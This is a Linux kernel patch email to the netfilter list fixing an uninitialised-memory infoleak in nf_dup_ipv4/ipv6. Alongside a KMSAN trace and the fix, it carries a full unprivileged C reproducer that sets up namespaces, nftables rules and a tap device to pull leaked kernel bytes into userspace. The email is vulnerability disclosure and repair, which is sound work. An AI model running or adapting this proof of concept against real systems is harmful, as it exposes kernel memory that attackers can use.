Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.218.41
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794826300;
	b=rFnwKH1qPJHJMadgjT7QQIBYXZX9/BBHDPabqYKZWOWyQXs8WWagwHb1FpuC6VjLFjDw
	 mgabkR7KWkzM66Rv3vnkVBt4gOQw9BDuo8HkqFxDSzq+zXJEwLHMR513fCdwQBYIMefeu
	 pPEgDn807jbCnB+pB8cmipjFlobGNqco4CTAgvTgBKLCoRX6nYCNiMtTiTJ9NdvsJlAOW
	 3zV/vNmB2R6ni2w1FKQSXBapYnpVpkxQxe5tfrJ9S4HwdMr4dg8yJ7ghRI8WgXrIZc9ch
	 TJh8Rd9IN7ApPDGA7xDpJXGCDHQ9T7Qr59zmfGtHMub/rehn7PXlElYrdBkAxlnTXpA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794826300;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-Id:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=vyqDs/iCM2PnPwlUfSu2Sm6axUcMfGk22WOiav+G410=;
	b=KXsTNNmxhio1luZmK3hg0KrDy2fOrXvZ5iYOi0LlNFTk3JM89htqs4CV2dtEpbrJYrTj
	 VKma3EnLtoLVL8Ifeipc1WQF4IJsLcEC6ute1bnD+K0aJgnXNYf5mtmsGRu1djpQaWayv
	 yyxDgJHJ1Zg/ZgDG+jR+jXBMFWLsVD3P7ob3usYok6zoaEW/4HrNj/AbHH1S4pOhtqpv/
	 U9y5B3SJ9vS7dt2VvHS6Cy12wkLflze9VDeexarKAHwvQRwkFy6LrbI0WLbnmQK6hRAO4
	 RxbwuMRqK6sOVjyYLHUCwyjJEW9yKPLGiMTisl2fiJ1zwRZRFa51QDQXMDRZVm4b1rg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=bG7yMulT;
	arc=none smtp.remote-ip=209.85.218.41
Received: from mail-ej1-f41.google.com (mail-ej1-f41.google.com [209.85.218.41])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 63CB2606A329
	for <netfilter-devel@vger.kernel.org>; Mon, 16 Nov 2026 10:51:39 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 63CB2606A329
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=bG7yMulT
Received: by mail-ej1-f41.google.com with SMTP id a640c23a62f3a-c4697404c2bso434637566b.2
        for <netfilter-devel@vger.kernel.org>; Mon, 16 Nov 2026 02:51:39 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794826298; x=1795431098; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=vyqDs/iCM2PnPwlUfSu2Sm6axUcMfGk22WOiav+G410=;
        b=bG7yMulTR5gNGl5AzyrXfbS+r6hR29YnzORHVP+uTKxFE39Gr5XtnrjScEJI0oOT3X
         cgfM5oPCvSDxw9Av41vyXhCzrkPXesL+dkh5XfKybTJC9UXCEmvdW6aSzOtONnijw20t
         vwIKvsx508yl4IgFVBrzseXLLEXFNaPBtwLzsTVZleFw9jsHWDGy6mOLrHROnUyah01K
         NZnzXCZi6ybOx+62usDRNjNnyziWh7OCWMezae1bLJYnDz6ypxJ345cRwT4JQTrVdDOk
         SQK77aWOsKfv/IpUpyK7eoUYhNfcm2x2SrTCeVBjVmq8wsH+E8ZNCBPxciNWN0FX/QWd
         RzoA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794826298; x=1795431098;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vyqDs/iCM2PnPwlUfSu2Sm6axUcMfGk22WOiav+G410=;
        b=NEEdnuRynjTpekgEG8qpOMEvpSpIu4MJoE2vMAh25YjPq5hqYtcoLTrsmgEy8i815e
         203nIGal+J1WK+NjEv+N2pSa2xk3MR9piELjC5yqSvA2eArVj7RSJopxLAQsV5+PwVMP
         H0NMGhh3bsN0zZGk4Awy2ZZpWmsKKme1Z+/JdIe/DDV4XhZGA4K/vivPkpZsuNcWYDyE
         RcIohSg6Cq5rvR6Wplyli1cnvEDofBtS9aXgiaZB5cZxuky4rJ+dmoV+Rlo06ZS9I8Nj
         S3IcoDIcifniIvFo0vLNwZEXCxqboUAbbLAc8GNQ9gqmN7Wx/LT/wzrTRKKd6OebUmGI
         V1Gw==
X-Forwarded-Encrypted: i=1; AL+hErEkXISIFFg/9bdmGaMo65qHMdTTBRewUvnEoV3MrdRuJlTkV9stwnbNZzXoN2KnQt8aNmHKoZWT3VmhwyiJg9Y=@vger.kernel.org
X-Gm-Message-State: APuU4Z8aJJGNR4xpo9iXj8OA9FPLEEiHjw6TuZyrQFq/SzqzwMf2kAIo
	F3V/AhHUKOjqpYK1yTh72QXqejQc22QSLDP6MDsi5Djv52ZAVOfC4zBP
X-Gm-Gg: AYBFou1pDpcJ8K7EWMygX0V8cm9DilbsqSbDXBhKgM8E4xCHrfX69r1OmPd+FJihcZO
	4Ea/fcRXVN40NK491pveTN6HBZ71JHO/29y78Mc+M3gW5FBPaQTZE+QyiGPD/1rRSgtYxozdtnh
	rAofPRRNX55JMsZKNk7xkSlbH6AoMxVibCJGqs/Z4+7fSfHR9VEXHu9gonARqXjgWbfvhqVuUJt
	MvpVo8Ae7j9/9I5FblN5t2Bv4ZECzMFo19uuLe3dVmSMd8xwrmIeTO7aTfDnjogqlsrA01C0jQ4
	bNl2n5g3zHWFmocP2TubWOk0c0kFjN8976GtOPx4UBWWjfgq8BEBVFgexNA48ettR5BlVd914TC
	iTdNU4vuCaKfY3Xtljrl8YYjNaReF5az+7V0L0rsbtPIIHi/wAe7YuL8D2+wOTPdtFGnkRGUoPE
	ClQQXSdmw5uf6Pr/iyAbrTa7QxBEDVamlNuMg1ICXSR3obh8B7T1m25ybygQD2xpOMNy/H7nX4t
	Ka9EN7d/mDsCic9Huma04mNTLe6cW73S2/nxYc3Ypts0LG3BwXeqQlghhiRXa967cyuCRp6O8vN
	+jGyNXmc9diZPJyuuP8kdCkCteOZfgu2iwtQDJME
X-Received: by 2002:a17:907:84c:b0:c40:80eb:c54e with SMTP id a640c23a62f3a-c509614f8b4mr754852266b.4.1794826297385;
        Mon, 16 Nov 2026 02:51:37 -0800 (PST)
Received: from theodors-laptop.. ([5.255.118.7])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c5095b6091dsm401002366b.57.2026.11.16.02.51.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 16 Nov 2026 02:51:37 -0800 (PST)
From: Theodor Arsenij Larionov Trichkine <theodorlarionov@gmail.com>
To: Pablo Neira Ayuso <pablo@netfilter.org>,
	Florian Westphal <fw@strlen.de>
Cc: Phil Sutter <phil@nwl.cc>,
	netfilter-devel@vger.kernel.org,
	coreteam@netfilter.org,
	netdev@vger.kernel.org,
	Theodor Arsenij Larionov Trichkine <theodorlarionov@gmail.com>
Subject: [PATCH nf] netfilter: nf_dup: unset mac_header on the duplicated packet
Date: Mon, 16 Nov 2026 13:51:13 +0300
Message-Id: <20261116105113.128791-1-theodorlarionov@gmail.com>
X-Mailer: git-send-email 2.34.1
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

nf_dup_ipv4() and nf_dup_ipv6() duplicate the packet with pskb_copy(),
which leaves the headroom uninitialised but keeps the mac_header offset.
On LOCAL_OUT and POST_ROUTING, an nft payload read of the link-layer
header of the copy loads those bytes, and a set element can return them
to userspace:

  BUG: KMSAN: kernel-infoleak in _copy_to_iter

Unset the mac header of the copy, as for a locally generated packet.

Fixes: e281b19897dc ("netfilter: xtables: inclusion of xt_TEE")
Cc: stable@vger.kernel.org
Signed-off-by: Theodor Arsenij Larionov Trichkine <theodorlarionov@gmail.com>
---
Found with a custom syzkaller-based fuzzer.

BUG: KMSAN: kernel-infoleak in _copy_to_iter+0x2a7/0x2cb0
 _copy_to_iter+0x2a7/0x2cb0
 __skb_datagram_iter+0x152/0x11d0
 skb_copy_datagram_iter+0x57/0x210
 netlink_recvmsg+0x493/0xf90
 sock_recvmsg+0x293/0x320
 __sys_recvfrom+0x292/0x570
 __x64_sys_recvfrom+0x12a/0x200
 do_syscall_64+0x13b/0x380
 entry_SYSCALL_64_after_hwframe+0x77/0x7f

Uninit was created at:
 kmem_cache_alloc_node_noprof+0x5f9/0x1140
 __alloc_skb+0x7e7/0x10f0
 __pskb_copy_fclone+0xd8/0x1b70
 nf_dup_ipv4+0x135/0xce0
 nft_dup_ipv4_eval+0x1dd/0x2d0
 nft_do_chain+0x444/0x2290
 nft_do_chain_ipv4+0x21b/0x2e0
 nf_hook_slow+0xca/0x380
 ip_rcv+0x6ab/0x820
 __netif_receive_skb+0x338/0xae0
 netif_receive_skb+0x64/0x680
 tun_rx_batched+0x3ea/0x9d0
 tun_get_user+0x59f3/0x6800
 tun_chr_write_iter+0x2e0/0x480
 vfs_write+0xd3d/0x16e0
 ksys_write+0x207/0x4e0
 do_syscall_64+0x13b/0x380
 entry_SYSCALL_64_after_hwframe+0x77/0x7f

Reproducer, runs as an unprivileged user:

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/if_tun.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

static char buf[16384];
static int len, nmsg;

static void die(const char *m) { perror(m); exit(1); }

static void write_file(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0 || write(fd, s, strlen(s)) != (ssize_t)strlen(s))
		die(path);
	close(fd);
}

static struct nlmsghdr *msg_begin(uint16_t type, uint16_t flags, uint8_t family, uint16_t res_id)
{
	struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + len);
	struct nfgenmsg *g;

	memset(nlh, 0, NLMSG_HDRLEN + sizeof(*g));
	nlh->nlmsg_type = type;
	nlh->nlmsg_flags = NLM_F_REQUEST | flags;
	nlh->nlmsg_seq = ++nmsg;
	g = NLMSG_DATA(nlh);
	g->nfgen_family = family;
	g->version = NFNETLINK_V0;
	g->res_id = htons(res_id);
	len += NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*g));
	return nlh;
}

static void msg_end(struct nlmsghdr *nlh) { nlh->nlmsg_len = buf + len - (char *)nlh; }

static struct nlmsghdr *nft_msg(uint16_t type, uint16_t flags, uint8_t family)
{
	return msg_begin(NFNL_SUBSYS_NFTABLES << 8 | type, NLM_F_ACK | flags, family, 0);
}

static void put(uint16_t type, const void *data, int dlen)
{
	struct nlattr *a = (struct nlattr *)(buf + len);

	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + dlen;
	memcpy((char *)a + NLA_HDRLEN, data, dlen);
	memset((char *)a + NLA_HDRLEN + dlen, 0, NLA_ALIGN(dlen) - dlen);
	len += NLA_ALIGN(a->nla_len);
}

static void put_str(uint16_t t, const char *s) { put(t, s, strlen(s) + 1); }
static void put_be32(uint16_t t, uint32_t v) { v = htonl(v); put(t, &v, 4); }

static struct nlattr *nest(uint16_t type)
{
	struct nlattr *a = (struct nlattr *)(buf + len);

	a->nla_type = NLA_F_NESTED | type;
	len += NLA_HDRLEN;
	return a;
}

static void nest_end(struct nlattr *a) { a->nla_len = buf + len - (char *)a; }

static void nl_send(int fd)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };

	if (sendto(fd, buf, len, 0, (struct sockaddr *)&sa, sizeof(sa)) != len)
		die("sendto netlink");
	len = 0;
}

static void nl_acks(int fd, int n)
{
	char rb[8192];

	while (n > 0) {
		int r = recv(fd, rb, sizeof(rb), 0);
		struct nlmsghdr *h;

		if (r < 0)
			die("recv ack");
		for (h = (struct nlmsghdr *)rb; NLMSG_OK(h, r); h = NLMSG_NEXT(h, r)) {
			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e = NLMSG_DATA(h);

				if (e->error) {
					fprintf(stderr, "netlink error %d (seq %u)\n", e->error, h->nlmsg_seq);
					exit(1);
				}
				n--;
			}
		}
	}
}

static struct nlattr *expr_data;

static struct nlattr *expr_begin(const char *name)
{
	struct nlattr *e = nest(NFTA_LIST_ELEM);

	put_str(NFTA_EXPR_NAME, name);
	expr_data = nest(NFTA_EXPR_DATA);
	return e;
}

static void expr_end(struct nlattr *e)
{
	nest_end(expr_data);
	nest_end(e);
}

static void add_chain(uint8_t family, const char *name, uint32_t hook)
{
	struct nlmsghdr *nlh = nft_msg(NFT_MSG_NEWCHAIN, NLM_F_CREATE, family);
	struct nlattr *h;

	put_str(NFTA_CHAIN_TABLE, "t");
	put_str(NFTA_CHAIN_NAME, name);
	put_str(NFTA_CHAIN_TYPE, "filter");
	h = nest(NFTA_CHAIN_HOOK);
	put_be32(NFTA_HOOK_HOOKNUM, hook);
	put_be32(NFTA_HOOK_PRIORITY, 0);
	nest_end(h);
	msg_end(nlh);
}

static void add_ruleset(uint8_t family, const void *gw, int gwlen)
{
	struct nlmsghdr *nlh;
	struct nlattr *l, *e, *d;

	nlh = nft_msg(NFT_MSG_NEWTABLE, NLM_F_CREATE, family);
	put_str(NFTA_TABLE_NAME, "t");
	msg_end(nlh);

	nlh = nft_msg(NFT_MSG_NEWSET, NLM_F_CREATE, family);
	put_str(NFTA_SET_TABLE, "t");
	put_str(NFTA_SET_NAME, "s");
	put_be32(NFTA_SET_FLAGS, NFT_SET_EVAL);
	put_be32(NFTA_SET_KEY_LEN, 16);
	put_be32(NFTA_SET_ID, 1);
	msg_end(nlh);

	add_chain(family, "pre", NF_INET_PRE_ROUTING);
	add_chain(family, "post", NF_INET_POST_ROUTING);

	nlh = nft_msg(NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND, family);
	put_str(NFTA_RULE_TABLE, "t");
	put_str(NFTA_RULE_CHAIN, "pre");
	l = nest(NFTA_RULE_EXPRESSIONS);
	e = expr_begin("immediate");
	put_be32(NFTA_IMMEDIATE_DREG, NFT_REG_1);
	d = nest(NFTA_IMMEDIATE_DATA);
	put(NFTA_DATA_VALUE, gw, gwlen);
	nest_end(d);
	expr_end(e);
	e = expr_begin("dup");
	put_be32(NFTA_DUP_SREG_ADDR, NFT_REG_1);
	expr_end(e);
	nest_end(l);
	msg_end(nlh);

	nlh = nft_msg(NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND, family);
	put_str(NFTA_RULE_TABLE, "t");
	put_str(NFTA_RULE_CHAIN, "post");
	l = nest(NFTA_RULE_EXPRESSIONS);
	e = expr_begin("payload");
	put_be32(NFTA_PAYLOAD_DREG, NFT_REG_1);
	put_be32(NFTA_PAYLOAD_BASE, NFT_PAYLOAD_LL_HEADER);
	put_be32(NFTA_PAYLOAD_OFFSET, 0);
	put_be32(NFTA_PAYLOAD_LEN, 16);
	expr_end(e);
	e = expr_begin("dynset");
	put_str(NFTA_DYNSET_SET_NAME, "s");
	put_be32(NFTA_DYNSET_SET_ID, 1);
	put_be32(NFTA_DYNSET_OP, NFT_DYNSET_OP_ADD);
	put_be32(NFTA_DYNSET_SREG_KEY, NFT_REG_1);
	expr_end(e);
	nest_end(l);
	msg_end(nlh);
}

static uint16_t csum(const void *p, int n)
{
	const uint16_t *w = p;
	uint32_t s = 0;

	for (; n > 1; n -= 2)
		s += *w++;
	while (s >> 16)
		s = (s & 0xffff) + (s >> 16);
	return ~s;
}

static int frame(unsigned char *f, int v6)
{
	memset(f, 0, 128);
	memset(f, 0xff, 6);
	memcpy(f + 6, "\x02\x00\x00\x00\x00\x09", 6);
	if (!v6) {
		unsigned char *ip = f + 14;

		f[12] = 0x08;
		ip[0] = 0x45;
		ip[3] = 28;
		ip[8] = 64;
		ip[9] = IPPROTO_UDP;
		inet_pton(AF_INET, "10.0.0.9", ip + 12);
		inet_pton(AF_INET, "10.0.0.3", ip + 16);
		*(uint16_t *)(ip + 10) = csum(ip, 20);
		ip[20] = 0x30;
		ip[22] = 0x30;
		ip[25] = 8;
		return 14 + 28;
	}
	f[12] = 0x86;
	f[13] = 0xdd;
	f[14] = 0x60;
	f[20] = 59;
	f[21] = 64;
	inet_pton(AF_INET6, "fd00::9", f + 22);
	inet_pton(AF_INET6, "fd00::3", f + 38);
	return 14 + 40;
}

static void walk(struct nlattr *a, int rem, int depth, int *nelem, int *nonzero)
{
	for (; rem >= NLA_HDRLEN && a->nla_len >= NLA_HDRLEN && a->nla_len <= rem;
	     rem -= NLA_ALIGN(a->nla_len), a = (struct nlattr *)((char *)a + NLA_ALIGN(a->nla_len))) {
		int t = a->nla_type & NLA_TYPE_MASK;
		struct nlattr *in = (struct nlattr *)((char *)a + NLA_HDRLEN);
		int ilen = a->nla_len - NLA_HDRLEN;

		if (depth == 0 && t == NFTA_SET_ELEM_LIST_ELEMENTS)
			walk(in, ilen, 1, nelem, nonzero);
		else if (depth == 1 && t == NFTA_LIST_ELEM)
			walk(in, ilen, 2, nelem, nonzero);
		else if (depth == 2 && t == NFTA_SET_ELEM_KEY)
			walk(in, ilen, 3, nelem, nonzero);
		else if (depth == 3 && t == NFTA_DATA_VALUE && ilen == 16) {
			static const unsigned char zero[14];

			(*nelem)++;
			if (memcmp(in, zero, 14))
				(*nonzero)++;
		}
	}
}

static void dump_set(int fd, uint8_t family, const char *name)
{
	static char rb[1 << 16];
	struct nlmsghdr *nlh;
	int nelem = 0, nonzero = 0, done = 0;

	nlh = msg_begin(NFNL_SUBSYS_NFTABLES << 8 | NFT_MSG_GETSETELEM, NLM_F_DUMP, family, 0);
	put_str(NFTA_SET_ELEM_LIST_TABLE, "t");
	put_str(NFTA_SET_ELEM_LIST_SET, "s");
	msg_end(nlh);
	nl_send(fd);
	while (!done) {
		int r = recv(fd, rb, sizeof(rb), 0);
		struct nlmsghdr *h;

		if (r < 0)
			die("recv dump");
		for (h = (struct nlmsghdr *)rb; NLMSG_OK(h, r); h = NLMSG_NEXT(h, r)) {
			if (h->nlmsg_type == NLMSG_DONE || h->nlmsg_type == NLMSG_ERROR) {
				done = 1;
				break;
			}
			walk((struct nlattr *)((char *)NLMSG_DATA(h) + NLMSG_ALIGN(sizeof(struct nfgenmsg))),
			     h->nlmsg_len - NLMSG_HDRLEN - NLMSG_ALIGN(sizeof(struct nfgenmsg)), 0, &nelem, &nonzero);
		}
	}
	printf("%s: %d set elements, %d with non-zero link-layer bytes\n", name, nelem, nonzero);
}

int main(int argc, char **argv)
{
	struct {
		struct in6_addr addr;
		uint32_t prefixlen;
		int ifindex;
	} ifr6 = { .prefixlen = 64 };
	struct sockaddr_in sin = { .sin_family = AF_INET };
	unsigned char gw4[4], gw6[16], f4[128], f6[128];
	int n = argc > 1 ? atoi(argv[1]) : 20000;
	uid_t uid = getuid();
	gid_t gid = getgid();
	struct ifreq ifr;
	int tap, s4, s6, nft, l4, l6, i;
	char map[64];

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET))
		die("unshare");
	write_file("/proc/self/setgroups", "deny");
	snprintf(map, sizeof(map), "0 %u 1", uid);
	write_file("/proc/self/uid_map", map);
	snprintf(map, sizeof(map), "0 %u 1", gid);
	write_file("/proc/self/gid_map", map);

	tap = open("/dev/net/tun", O_RDWR);
	if (tap < 0)
		die("tun");
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "tap0");
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
	if (ioctl(tap, TUNSETIFF, &ifr))
		die("TUNSETIFF");
	s4 = socket(AF_INET, SOCK_DGRAM, 0);
	s6 = socket(AF_INET6, SOCK_DGRAM, 0);
	inet_pton(AF_INET, "10.0.0.1", &sin.sin_addr);
	memcpy(&ifr.ifr_addr, &sin, sizeof(sin));
	if (ioctl(s4, SIOCSIFADDR, &ifr))
		die("SIOCSIFADDR");
	inet_pton(AF_INET, "255.255.255.0", &sin.sin_addr);
	memcpy(&ifr.ifr_netmask, &sin, sizeof(sin));
	if (ioctl(s4, SIOCSIFNETMASK, &ifr))
		die("SIOCSIFNETMASK");
	ifr.ifr_flags = IFF_UP;
	if (ioctl(s4, SIOCSIFFLAGS, &ifr))
		die("SIOCSIFFLAGS");
	inet_pton(AF_INET6, "fd00::1", &ifr6.addr);
	ifr6.ifindex = if_nametoindex("tap0");
	if (ioctl(s6, SIOCSIFADDR, &ifr6))
		die("SIOCSIFADDR v6");

	nft = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	if (nft < 0)
		die("nft socket");
	inet_pton(AF_INET, "10.0.0.2", gw4);
	inet_pton(AF_INET6, "fd00::2", gw6);
	msg_end(msg_begin(NFNL_MSG_BATCH_BEGIN, 0, AF_UNSPEC, NFNL_SUBSYS_NFTABLES));
	nmsg = 0;
	add_ruleset(NFPROTO_IPV4, gw4, 4);
	add_ruleset(NFPROTO_IPV6, gw6, 16);
	i = nmsg;
	msg_end(msg_begin(NFNL_MSG_BATCH_END, 0, AF_UNSPEC, NFNL_SUBSYS_NFTABLES));
	nl_send(nft);
	nl_acks(nft, i);

	l4 = frame(f4, 0);
	l6 = frame(f6, 1);
	for (i = 0; i < n; i++) {
		if (write(tap, f4, l4) != l4 || write(tap, f6, l6) != l6)
			die("write tap");
	}
	usleep(200000);

	dump_set(nft, NFPROTO_IPV4, "ipv4");
	dump_set(nft, NFPROTO_IPV6, "ipv6");
	return 0;
}

 net/ipv4/netfilter/nf_dup_ipv4.c | 2 ++
 net/ipv6/netfilter/nf_dup_ipv6.c | 2 ++
 2 files changed, 4 insertions(+)

diff --git a/net/ipv4/netfilter/nf_dup_ipv4.c b/net/ipv4/netfilter/nf_dup_ipv4.c
index 9a773502f10a..325e53bb836c 100644
--- a/net/ipv4/netfilter/nf_dup_ipv4.c
+++ b/net/ipv4/netfilter/nf_dup_ipv4.c
@@ -65,6 +65,8 @@ void nf_dup_ipv4(struct net *net, struct sk_buff *skb, unsigned int hooknum,
 	if (skb == NULL)
 		goto out;
 
+	skb_unset_mac_header(skb);
+
 #if IS_ENABLED(CONFIG_NF_CONNTRACK)
 	/* Avoid counting cloned packets towards the original connection. */
 	nf_reset_ct(skb);
diff --git a/net/ipv6/netfilter/nf_dup_ipv6.c b/net/ipv6/netfilter/nf_dup_ipv6.c
index 6da3102b7c1b..1bacddb91af9 100644
--- a/net/ipv6/netfilter/nf_dup_ipv6.c
+++ b/net/ipv6/netfilter/nf_dup_ipv6.c
@@ -54,6 +54,8 @@ void nf_dup_ipv6(struct net *net, struct sk_buff *skb, unsigned int hooknum,
 	if (skb == NULL)
 		goto out;
 
+	skb_unset_mac_header(skb);
+
 #if IS_ENABLED(CONFIG_NF_CONNTRACK)
 	nf_reset_ct(skb);
 	nf_ct_set(skb, NULL, IP_CT_UNTRACKED);
-- 
2.34.1

